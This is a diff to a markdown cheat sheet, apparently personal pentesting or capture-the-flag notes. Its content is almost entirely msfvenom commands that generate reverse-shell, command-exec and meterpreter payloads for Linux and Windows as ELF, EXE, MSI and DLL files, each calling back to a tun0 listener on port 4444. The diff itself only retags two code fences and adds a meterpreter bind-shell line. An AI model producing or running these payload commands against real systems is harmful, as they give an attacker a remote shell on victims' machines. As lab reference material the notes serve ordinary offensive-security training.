@@ -74,7 +74,7 @@ All examples are asking the target to connect back to `tun0` IP at the port `444
 
 * **Linux** (.elf / ...)
 
-```bash
+```bash!
 # execute /bin/bash -p
 $ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
 # Generate a .elf opening a reverse shell (TCP)
@@ -85,7 +85,7 @@ $ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=4444 -f raw
 
 * **Windows** (.exe / .msi / ...)
 
-```bash
+```bash!
 # Generate a .exe opening a reverse shell (TCP)
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
 # Generate a malicious installer (msi)
@@ -95,6 +95,7 @@ $ msfvenom -p windows/x64/exec cmd='<some command>' -f dll -o malicious.dll
 $ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o malicious.dll
 # Meterpreter - use the same payload in multi/handler
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
+$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o shell.exe LPORT=4444
 ```
 </div><div>
 
